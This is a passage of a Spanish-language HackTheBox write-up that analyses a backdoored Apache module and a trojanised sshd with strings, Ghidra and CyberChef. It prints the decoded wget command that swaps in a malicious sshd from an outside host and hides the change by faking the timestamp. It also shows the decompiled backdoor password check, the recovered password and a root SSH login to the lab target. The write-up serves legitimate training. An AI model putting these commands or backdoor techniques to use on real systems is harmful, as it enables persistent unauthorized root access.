	<span class="k">for</span> &lt;steven@production&gt;<span class="p">;</span> Sun, 25 Jul 2021 10:31:12 GMT
Received: <span class="o">(</span>from root@localhost<span class="o">)</span>
	by production <span class="o">(</span>8.15.2/8.15.2/Submit<span class="o">)</span> <span class="nb">id </span>80FAcdZ171847<span class="p">;</span>
	Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If <span class="k">for </span>any reason you need access to the database or web application code, get <span class="k">in </span><span class="nb">touch </span>with Mark and he
will generate a temporary password <span class="k">for </span>you to authenticate to the temporary server.

Thanks,
sysadmin
</pre></table></code></div></div><p>El <code class="language-plaintext highlighter-rouge">sysadmin</code> le menciona a steven un comportamiento raro con el servidor apache a pesar de haber actualizado el sistema. Vayamos a revisar. En la ruta <code class="language-plaintext highlighter-rouge">/lib/apache2/modules</code> vemos una cantidad de archivos aparentemente normales; sin embargo, el <em>comportamiento extraño</em> puede darnos la idea de que alguien más ha comprometido el sistema, y por lo tanto, ha manipulado archivos para mantener su persistencia. Así que revisemos bien los archivos que hay: <img data-src="/assets/favicon/2022-07-04/undetected4.png" alt="undetected 6" data-proofer-ignore></p><p>Vemos que un archivo ha sido manipulado recientemente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">-rw-r--r--</span> 1 root root 34800 May 17 2021 mod_reader.so
</pre></table></code></div></div><p>Nos traemos el archivo a nuestra máquina para revisarlo como hicimos con el último:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ strings mod_reader.so
</pre></table></code></div></div><p>Hay una cadena en base 64. Procedemos a decodificarla y la guardamos en un archivo como evidencia:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk"</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> mod_reader_hex.txt
</pre></table></code></div></div><p>Vemos lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ <span class="nb">cat </span>mod_reader_hex.txt
wget sharefiles.xyz/image.jpeg <span class="nt">-O</span> /usr/sbin/sshd<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="sb">`</span><span class="nb">date</span> +%Y-%m-%d <span class="nt">-r</span> /usr/sbin/a2enmod<span class="sb">`</span> /usr/sbin/sshd
</pre></table></code></div></div><p>Esto es un poco raro ya que hay un archivo de apache (<code class="language-plaintext highlighter-rouge">mod_reader.so</code>) que está haciendo algo con el demonio de ssh, están pasando cosas por aquí.</p><p>Puede que el demonio de ssh haya sido manipulado, por lo que vamos a traer el binario de la máquina victima a la nuestra para analizarlo.</p><p>Haciendo un <code class="language-plaintext highlighter-rouge">strings</code> al binario filtrando por la palabra “backdoor”, vemos lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ strings sshd | <span class="nb">grep</span> <span class="s2">"backdoor"</span> | <span class="nb">sort</span> <span class="nt">-u</span>
backdoor
backdoor_active
backdoor.h
</pre></table></code></div></div><p>Podemos intuir que efectivamente se ha manipulado el binario.</p><p>Abrimos nuestro analizador de confinza <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> para descompilar el binario: <img data-src="/assets/favicon/2022-07-04/undetected6.png" alt="Ghidra" data-proofer-ignore></p><p>Comenzamos a buscar funciones que pudieron ser modificadas, nos encontramos con la función <code class="language-plaintext highlighter-rouge">auth_passwd</code> que tiene lo siguiente: <img data-src="/assets/favicon/2022-07-04/undetected7.png" alt="Ghidra" data-proofer-ignore></p><p>En la linea 29 puede que no esté interpretando bien el valor, así que lo cambiamos dando clic izquierdo sobre él y haciendo clic en lo que nos interesa. En este caso a <code class="language-plaintext highlighter-rouge">char</code>.</p><p>Procedamos a analizar lo que está sucediendo allí. Prestemos atención a la variable “backdoor” la cual tiene un espacio total de 31 caracteres.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="cm">/* WARNING: Could not reconcile some variable overlaps */</span>
<span class="kt">int</span> <span class="nf">auth_password</span><span class="p">(</span><span class="n">ssh</span> <span class="o">*</span><span class="n">ssh</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">){</span>
  <span class="n">Authctxt</span> <span class="o">*</span><span class="n">ctxt</span><span class="p">;</span>
  <span class="n">passwd</span> <span class="o">*</span><span class="n">ppVar1</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">uVar3</span><span class="p">;</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">pbVar4</span><span class="p">;</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">pbVar5</span><span class="p">;</span>
  <span class="n">ulong</span> <span class="n">uVar6</span><span class="p">;</span>
  <span class="n">byte</span> <span class="n">bVar7</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar8</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
	<span class="c1">//se asigna 31 caracteres de longitud</span>
  <span class="kt">char</span> <span class="n">backdoor</span> <span class="p">[</span><span class="mi">31</span><span class="p">];</span>
  <span class="n">byte</span> <span class="n">abStack57</span> <span class="p">[</span><span class="mi">9</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">lStack48</span><span class="p">;</span>
  
  <span class="n">bVar7</span> <span class="o">=</span> <span class="mh">0xd6</span><span class="p">;</span>
  <span class="n">ctxt</span> <span class="o">=</span> <span class="p">(</span><span class="n">Authctxt</span> <span class="o">*</span><span class="p">)</span><span class="n">ssh</span><span class="o">-&gt;</span><span class="n">authctxt</span><span class="p">;</span>
  <span class="n">lStack48</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
	<span class="c1">//a las siguientes variables se les asignan valores en hexadecimal</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_28_2_</span> 	<span class="o">=</span> <span class="mh">0xa9f4</span><span class="p">;</span>
  <span class="n">ppVar1</span> 			      <span class="o">=</span> <span class="n">ctxt</span><span class="o">-&gt;</span><span class="n">pw</span><span class="p">;</span>
  <span class="n">iVar8</span> 			      <span class="o">=</span> <span class="n">ctxt</span><span class="o">-&gt;</span><span class="n">valid</span><span class="p">;</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_24_4_</span> 	<span class="o">=</span> <span class="mh">0xbcf0b5e3</span><span class="p">;</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_16_8_</span> 	<span class="o">=</span> <span class="mh">0xb2d6f4a0fda0b3d6</span><span class="p">;</span>
  <span class="n">backdoor</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> 		  <span class="o">=</span> <span class="mh">0xa5</span><span class="p">;</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_0_4_</span> 	  <span class="o">=</span> <span class="mh">0xf0e7abd6</span><span class="p">;</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_4_4_</span> 	  <span class="o">=</span> <span class="mh">0xa4b3a3f3</span><span class="p">;</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_8_4_</span> 	  <span class="o">=</span> <span class="mh">0xf7bbfdc8</span><span class="p">;</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_12_4_</span> 	<span class="o">=</span> <span class="mh">0xfdb3d6e7</span><span class="p">;</span>
  <span class="n">pbVar4</span> 			      <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">backdoor</span><span class="p">;</span>

  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">pbVar5</span> <span class="o">=</span> <span class="n">pbVar4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="o">*</span><span class="n">pbVar4</span> <span class="o">=</span> <span class="n">bVar7</span> <span class="o">^</span> <span class="mh">0x96</span><span class="p">;</span> <span class="c1">//se está haciendo un XOR con la key 0x96 a la password ingresada</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pbVar5</span> <span class="o">==</span> <span class="n">abStack57</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
    <span class="n">bVar7</span> <span class="o">=</span> <span class="o">*</span><span class="n">pbVar5</span><span class="p">;</span>
    <span class="n">pbVar4</span> <span class="o">=</span> <span class="n">pbVar5</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="mh">0xa4b3a3f3f0e7abd6</span><span class="p">,</span><span class="n">password</span><span class="p">);</span> <span class="c1">//se compara el input que se pasa al conectarse por </span>
	<span class="c1">// ssh (la contraseña)</span>
  <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//si la comparación y el input son iguales entra a este flujo</span>
    <span class="n">uVar6</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">uVar6</span> <span class="o">&lt;</span> <span class="mh">0x401</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">ppVar1</span><span class="o">-&gt;</span><span class="n">pw_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">permit_root_login</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">iVar8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">password</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="o">||</span>
         <span class="p">(</span><span class="n">uVar3</span> <span class="o">=</span> <span class="n">options</span><span class="p">.</span><span class="n">permit_empty_passwd</span><span class="p">,</span> <span class="n">options</span><span class="p">.</span><span class="n">permit_empty_passwd</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">auth_password</span><span class="o">::</span><span class="n">expire_checked</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">auth_password</span><span class="o">::</span><span class="n">expire_checked</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="n">iVar2</span> <span class="o">=</span> <span class="n">auth_shadow_pwexpired</span><span class="p">(</span><span class="n">ctxt</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">ctxt</span><span class="o">-&gt;</span><span class="n">force_pwchange</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">iVar2</span> <span class="o">=</span> <span class="n">sys_auth_passwd</span><span class="p">(</span><span class="n">ssh</span><span class="p">,</span><span class="n">password</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ctxt</span><span class="o">-&gt;</span><span class="n">force_pwchange</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">auth_restrict_session</span><span class="p">(</span><span class="n">ssh</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">uVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">iVar8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lStack48</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">uVar3</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">__stack_chk_fail</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Bueno, vamos a intentar sacar conclusiones sobre lo visto. Parece que hay una palabra clave deconstruida en las variables “backdoor” y en el bucle <code class="language-plaintext highlighter-rouge">while</code> como lo dejé comentado. Se está haciendo un <code class="language-plaintext highlighter-rouge">XOR</code>, así que vamos a construir esa palabra clave tal que así:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>backdoor[30] 	<span class="o">=</span> 0xa5<span class="p">;</span>
backdoor._28_2_	<span class="o">=</span> 0xa9f4<span class="p">;</span>
backdoor._24_4_ <span class="o">=</span> 0xbcf0b5e3<span class="p">;</span>
backdoor._16_8_ <span class="o">=</span> 0xb2d6f4a0fda0b3d6<span class="p">;</span>
backdoor._12_4_ <span class="o">=</span> 0xfdb3d6e7<span class="p">;</span>
backdoor._8_4_ 	<span class="o">=</span> 0xf7bbfdc8<span class="p">;</span>
backdoor._4_4_ 	<span class="o">=</span> 0xa4b3a3f3<span class="p">;</span>
backdoor._0_4_ 	<span class="o">=</span> 0xf0e7abd6<span class="p">;</span>
</pre></table></code></div></div><p>Ahora vamos a jugar con CyberChef: <img data-src="/assets/favicon/2022-07-04/undetected8.png" alt="CyberChef" data-proofer-ignore></p><p>Por último nos intentamos conectar como root a la máquina victima con la contraseña obtenida:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ sshpass <span class="nt">-p</span> <span class="s1">'@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3'</span> ssh root@10.10.11.146
</pre></table></code></div></div><p>Y efecticamente, esa era la comparación que se estaba haciendo en el demonio de ssh modificado.</p><p>¡Happy Hacking!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/writeup/'>WriteUp</a>, <a href='/categories/machines/'>Machines</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sshd/" class="post-tag no-text-decoration" >sshd</a> <a href="/tags/reversing/" class="post-tag no-text-decoration" >reversing</a> <a href="/tags/attacks-backdoor/" class="post-tag no-text-decoration" >Attacks/Backdoor</a> <a href="/tags/strings/" class="post-tag no-text-decoration" >strings</a> <a href="/tags/ghidra/" class="post-tag no-text-decoration" >Ghidra</a> <a href="/tags/php-unit/" class="post-tag no-text-decoration" >PHP Unit</a> <a href="/tags/cyberchef/" class="post-tag no-text-decoration" >CyberChef</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=WriteUp+Undetected+HTB+-+rabb1t&url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Undetected-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=WriteUp+Undetected+HTB+-+rabb1t&u=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Undetected-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Undetected-HTB%2F&text=WriteUp+Undetected+HTB+-+rabb1t" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/burpsuite-socks/">Socks y BurpSuite</a><li><a href="/posts/WriteUp-Undetected-HTB/">WriteUp Undetected HTB</a><li><a href="/posts/WriteUp-Late-HTB/">WriteUp Late HTB</a><li><a href="/posts/WriteUp-TimeLapse-HTB/">WriteUp TimeLapse HTB</a><li><a href="/posts/WriteUp-Noter-HTB/">WriteUp Noter HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/WriteUp-Late-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1659157200" > 2022-07-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Late HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Explotando la vulnerabilidad SSTI Escalando privilegios Transición de archivos Anal...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-Noter-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1662094800" > 2022-09-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Noter HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Fase de enumeración Enumerando usuarios ¿Tienes algún secreto? Accediendo a ftp como blue A...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-TimeLapse-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1660971600" > 2022-08-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp TimeLapse HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Enumeración SMB Crackeando contraseñas Obteniendo acceso como legacyy Obteniendo credencial...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/burpsuite-socks/" class="btn btn-outline-primary" prompt="Anterior"><p>Socks y BurpSuite</p></a> <a href="/posts/WriteUp-Late-HTB/" class="btn btn-outline-primary" prompt="Nuevo"><p>WriteUp Late HTB</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "rabb1t-0/rabb1t-0.github.io", "data-repo-id": "R_kgDOHL8JPA", "data-category": "general", "data-category-id": "DIC_kwDOHL8JPM4CPeS9", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/rabb1t-0">rabb1t</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
